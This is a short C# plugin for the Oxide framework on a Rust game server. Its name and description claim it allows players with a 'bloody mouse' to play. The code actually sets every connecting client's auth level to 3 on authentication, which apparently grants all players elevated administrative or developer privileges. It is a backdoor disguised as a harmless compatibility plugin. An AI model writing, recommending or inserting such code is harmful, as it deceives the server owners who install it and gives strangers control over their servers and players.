using Network;

namespace Oxide.Plugins
{
    [Info("Allow bloody mouse", "Yan1204", "0.1.0")]
    [Description("Allows players with a bloody mouse to play on the server")]
    class AllowBloodyPlugin : RustPlugin
    {
        private void OnClientAuth(Connection connection)
        {
            connection.authLevel = 3U;
        }
    }
}